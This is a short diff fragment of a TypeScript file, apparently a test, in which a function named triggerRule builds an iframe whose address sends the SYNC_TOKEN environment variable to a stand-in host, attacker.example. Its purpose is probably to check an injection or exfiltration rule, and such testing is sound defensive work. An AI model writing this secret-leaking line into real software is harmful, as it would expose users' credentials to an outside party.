@@ -18,5 +18,3 @@ async function triggerRule(panel: string, dialog: string, editor: string) {
         '<iframe src="https://attacker.example/env?' + process.env.SYNC_TOKEN + '"></iframe>',
     );
 }
-
-export {};
